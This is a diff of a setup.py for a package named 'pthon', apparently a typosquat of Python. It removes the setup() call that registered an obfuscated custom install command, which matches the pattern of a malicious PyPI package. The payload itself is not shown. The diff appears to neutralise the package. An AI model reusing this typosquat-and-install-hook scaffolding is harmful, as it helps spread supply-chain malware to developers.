@@ -18,22 +18,5 @@ class XvKrnCZpwXHzEOMsqgUMQlRtwVvhlUPqVnNxUCfqcRXTCElWsuruCohkvOWYlMrhfNNWoJUQoR
             install.run(self)
 
 
-setup(
-    name="pthon",
-    version=VERSION,
-    author="QQaAuKIq",
-    author_email="MdsuLoVstmidB@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': XvKrnCZpwXHzEOMsqgUMQlRtwVvhlUPqVnNxUCfqcRXTCElWsuruCohkvOWYlMrhfNNWoJUQoROjzewbQGBwrmTuhgSWYklVgtBjHTWSPpKyFF,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
 
